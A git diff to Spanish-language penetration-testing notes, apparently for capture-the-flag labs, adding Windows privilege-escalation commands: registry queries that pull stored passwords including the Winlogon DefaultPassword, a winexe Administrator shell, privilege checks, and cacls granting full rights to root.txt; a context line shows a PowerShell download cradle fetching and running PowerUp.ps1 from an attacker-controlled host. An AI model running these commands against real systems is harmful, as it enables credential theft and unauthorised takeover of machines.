@@ -58,6 +58,25 @@ una vez que es true podemos continuar y no van a darnos falsos positivos
 
 ## Privesec
 
+#### obtencion de passwords
+```Python
+reg query HKLM /f  password /t REG_SZ /s
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul |findstr "DefaultUserName DefaultDomainName DefaultPassword"
+```
+
+#### winexe
+ya cuando tenemos el tunnel hecho
+```Python
+winexe -U Administrator //127.0.0.1 "cmd.exe"
+```
+
+#### netstat
+recordar el exploit zzz para el samba
+```Python
+netstat -nat
+```
+
 #### windows suggester
 [windows exploit suggester bacan](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
@@ -73,6 +92,19 @@ una vez que es true podemos continuar y no van a darnos falsos positivos
 
 se copia todo el output en un archivo .txt y se ejecuta el comando o binario del wesng
 
+#### ver permisos de ejecucion y como se ejecuta (tipo SUID)
+
+```Python
+PS C:\Users\Public\Desktop> $sh = New-Object -ComObject Wscript.Shell
+PS C:\Users\Public\Desktop> $target = $sh.CreateShortcut('C:\Users\Public\Desktop\theprogram')
+PS C:\Users\Public\Desktop> echo $target
+```
+
+#### whoami
+```Python
+whoami /priv
+```
+
 #### powerSploit
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 
@@ -87,6 +119,18 @@ luego:
 
 ```Python
 IEX(New-Object Net.WebClient).downloadString('http://myIp:8000/PowerUp.ps1')
+```
+
+#### cacls (access control list)
+permisos para cada usuario, donde F es Full privilegios
+
+```Python
+cacls Administrator
+```
+
+```Python
+cacls root.txt /grant TheUserMY:F
+Y (yes)
 ```
 
 ## subir archivos binarios y ejecturlos en la maquina
